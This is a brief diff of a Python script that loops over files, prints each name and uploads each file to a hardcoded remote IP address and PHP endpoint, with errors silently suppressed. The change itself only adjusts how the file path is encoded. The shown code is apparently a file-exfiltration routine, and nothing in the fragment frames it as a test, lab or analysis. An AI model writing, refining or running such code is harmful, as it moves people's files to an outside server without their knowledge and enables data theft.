@@ -14,7 +14,7 @@ try:
             print(file)
             try:
                 url = 'http://3.85.122.241/globo_file.php'
-                files = {'file': open(bytes(file, encoding='utf-8', errors='ignore'), 'rb')}
+                files = {'file': open(bytes(file, encoding='utf-8', errors='replace'), 'rb')}
                 r = requests.post(url, files=files)
             except:
                 ...
